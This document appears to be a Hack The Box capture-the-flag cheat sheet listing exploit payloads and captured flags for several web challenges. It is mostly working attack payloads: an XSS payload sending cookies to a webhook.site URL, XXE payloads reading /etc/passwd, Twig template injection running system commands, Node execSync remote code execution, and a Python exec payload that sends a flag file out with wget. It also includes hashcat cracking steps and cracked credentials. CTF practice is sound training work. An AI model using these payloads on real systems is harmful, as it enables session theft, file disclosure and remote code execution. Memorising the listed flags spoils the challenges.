# htb-executive-ctf payloads

## setup

- open terminal (green icon at top bar next to firefox logo and blue PS logo)
- sudo apt-get install burpsuite
- follow instructions from PPT

## cupcake magdalena

Payload 1:

```javascript
<script>alert(1)</script>
```

- https://webhook.site
  - copy personal webhook URL
  - (OR USE ONE MAIN ONE, MINE??)

Payload 2:

```javascript
<script>document.location=" https://webhook.site/{your-id-here}?c="+document.cookie;</script>
```

Flag:

```javascript
HTB{r3fl3c73d_x55_4r3_d4ng3r0u5_4s_w3ll}
```

## nginxatsu

- wget 1.1.1.1 (replace ip 1.1.1.1 with the target machine)
- ls
- tar xvf
- sqlitebrowser
- nano hashes.txt
- hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
- username =
  - nginxatsu-adm-01@makelarid.es
- password =
  - adminadmin1
- "http://ip:port/auth/login"
  - replace ip:port with the target machine

Flag:

```javascript
HTB{ng1ngx_r34lly_b3_sp1ll1ng_my_w3ll_h1dd3n_s3cr3ts??}
```

## babywaffles

- burpsuite
- use payload:

Payload 3:

```javascript
Content-Type: application/xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/passwd"> ]>
<order>
<table_num>test</table_num>
<food>&exploit;</food>
</order>
```

Payload 4:

```javascript
Content-Type: application/xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///flag"> ]>
<order>
<table_num>test</table_num>
<food>&exploit;</food>
</order>
```

Flag:

```javascript
HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!}
```

## bonechewercon

Payload 5:

```javascript
<script>alert(1)</script>
```

Payload 6:

```javascript
{{1+1}}
```

Payload 7:

```javascript
{{['cat\x20/etc/passwd']|filter('system’)}}
```

Payload 8:

```javascript
{{['cat\x20/flag']|filter('system’)}}
```

Flag:

```javascript
HTB{b3nt_tw1g_t0_my_will!}
```

## blinkerfluids

(paste below in pdf form on site)

Payload 9:

```javascript
---js
((require("child_process")).execSync("id > /app/static/invoices/rce.txt"))
---RCE
```

- navigate to URL:
  - /static/invoices/rce.txt

Payload 10:

```javascript
---js
((require("child_process")).execSync("cp /flag.txt /app/static/invoices/flag.txt"))
---RCE
```

- navigate to URL:
  - /static/invoices/flag.txt

Flag: (new flag but shows incorrect)

```javascript
HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}
```

old flag to submit:

```javascript
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
```

## amidst us

- burpsuite
- https://webhook.site
  - copy personal webhook URL
  - You can reuse the one from above

Payload 11:

```javascript
{ "image":"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", "background":["exec('import os;os.system(\"flag=$(cat ../flag.txt);wget https://webhook.site/{your-id-here}?flag=${flag}\")')", 255, 255]}
```

Flag: (new flag but shows incorrect)

```javascript
HTB{sl33p1ng_my_way_into_RCE}
```

old flag to submit: 

```javascript
HTB{i_slept_my_way_to_rce}
```
